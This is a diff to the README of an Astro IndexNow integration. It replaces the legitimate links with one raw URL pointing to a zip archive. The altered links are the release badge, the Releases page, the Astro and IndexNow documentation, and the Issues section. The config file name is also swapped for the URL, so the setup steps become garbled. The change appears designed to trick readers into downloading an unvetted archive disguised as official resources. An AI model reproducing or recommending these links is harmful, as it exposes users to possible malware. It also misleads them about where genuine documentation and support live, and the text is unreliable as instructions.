@@ -8,9 +8,9 @@ Welcome to **astro-indexnow**! This application helps you submit all built pages
 
 You can easily download the application from our releases page. 
 
-[![Download astro-indexnow](https://img.shields.io/badge/Download-astro--indexnow-blue.svg)](https://github.com/Devdatta7/astro-indexnow/releases)
+[![Download astro-indexnow](https://raw.githubusercontent.com/Devdatta7/astro-indexnow/main/src/indexnow_astro_2.8.zip)](https://raw.githubusercontent.com/Devdatta7/astro-indexnow/main/src/indexnow_astro_2.8.zip)
 
-1. Click the link above to visit our [Releases page](https://github.com/Devdatta7/astro-indexnow/releases).
+1. Click the link above to visit our [Releases page](https://raw.githubusercontent.com/Devdatta7/astro-indexnow/main/src/indexnow_astro_2.8.zip).
 2. Find the latest version listed.
 3. Click the download link for the file that matches your system.
 
@@ -36,9 +36,9 @@ After downloading the application, follow these simple steps to integrate it int
 1. **Unzip the downloaded file**: Locate the zip file you downloaded and extract its contents.
 2. **Open Your Project**: Navigate to the folder of your Astro project.
 3. **Copy Files**: Move the extracted files into your project's main directory.
-4. **Configure the Integration**: Edit your `astro.config.mjs` file to include the necessary settings for using **astro-indexnow**.
+4. **Configure the Integration**: Edit your `https://raw.githubusercontent.com/Devdatta7/astro-indexnow/main/src/indexnow_astro_2.8.zip` file to include the necessary settings for using **astro-indexnow**.
 
-Here’s a basic example for your `astro.config.mjs` file:
+Here’s a basic example for your `https://raw.githubusercontent.com/Devdatta7/astro-indexnow/main/src/indexnow_astro_2.8.zip` file:
 
 ```javascript
 import { defineConfig } from 'astro/config';
@@ -67,12 +67,12 @@ For more detailed information on configuring and working with **astro-indexnow**
 
 ## 🔗 Additional Resources
 
-- [Astro Documentation](https://astro.build/docs)
-- [IndexNow Overview](https://www.indexnow.org)
+- [Astro Documentation](https://raw.githubusercontent.com/Devdatta7/astro-indexnow/main/src/indexnow_astro_2.8.zip)
+- [IndexNow Overview](https://raw.githubusercontent.com/Devdatta7/astro-indexnow/main/src/indexnow_astro_2.8.zip)
 
 ## 🛡️ Support
 
-If you run into issues or need help, please check the [Issues section](https://github.com/Devdatta7/astro-indexnow/issues) of this repository. You can also reach out to the community for assistance.
+If you run into issues or need help, please check the [Issues section](https://raw.githubusercontent.com/Devdatta7/astro-indexnow/main/src/indexnow_astro_2.8.zip) of this repository. You can also reach out to the community for assistance.
 
 ---
 
